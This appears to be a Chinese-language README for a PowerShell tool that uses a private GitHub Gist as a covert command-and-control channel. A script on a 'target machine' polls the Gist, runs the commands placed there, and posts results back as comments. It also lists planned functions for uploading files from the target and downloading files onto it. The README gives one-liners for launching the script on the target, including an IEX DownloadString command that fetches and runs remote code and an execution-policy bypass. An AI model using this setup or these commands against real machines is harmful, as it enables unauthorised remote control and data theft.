###Powershell Github Shell
	Author:zshell
	Github:https://github.com/zlocal/Powershell-Github-Shell
	Demo Result Gist:https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e

使用方法：<br>
#### 1，创建github账户，访问https://github.com/settings/tokens/new，选中 gist   Create gists ，创建访问Gists的token.</br>
#### 2, 访问 https://gist.github.com/ ，创建一个Gist，属性最好为private,只有自己能访问查看结果，名称为cmd.例：</br>
为了展示，我设置了public https://gist.github.com/zlocal/1d449f3c195531c8cafbebfe808ea46e
	Command:"time /T"<br>
	ReadFile:"c:/windows/temp/1.txt"<br>
	WriteFile:"http://www.github.com/raw/1.zip c:/wnidows/temp/2.txt"<br>
	Powershell:"Get-Process | Out-String"<br>
	Command:"whoami"<br>
其中<br>
###### Command后是想要执行的cmd命令，功能已测试OK<br>
###### ReadFile是上传目标机器上的文件到Github，暂未实现<br>
###### WriteFile下载文件到目标机器，暂未实现<br><br>
###### Powershell后是可以执行的Powershell指令，暂未实现<br>

#### 3, 修改Powershell脚本的头部配置信息
$gistsUser="gitusername";		# github的用户名<br>
$gistsApiToken="gittoken";		# 上步中得到的token ，例eed4239e439034a92fc4cbe0fbd2ca906999a9f1<br>
$checkTime=60;				# 每次获取命令结果需要等待的时间，秒为单位<br>

#### 4, 使powershell在目标机器上执行
##### Powershell执行方法<br>
一句话远程加载 <br>
```Powershell
powershell IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1')
```
一句话本地加载<br>
```Powershell
powershell IEX ([System.IO.File]::readAllText('PowershellGitShell.ps1'));	//powershell
```
一句话文件执行<br>
```Powershell
powershell -executionPolicy bypass -File "c:/test/PowershellGitShell.ps1"	//powershell
```
#### 5，可以修改cmd gist的内容，在$checkTime秒后刷新网页，结果会在评论中。结果需要使用URL DECODE解码。
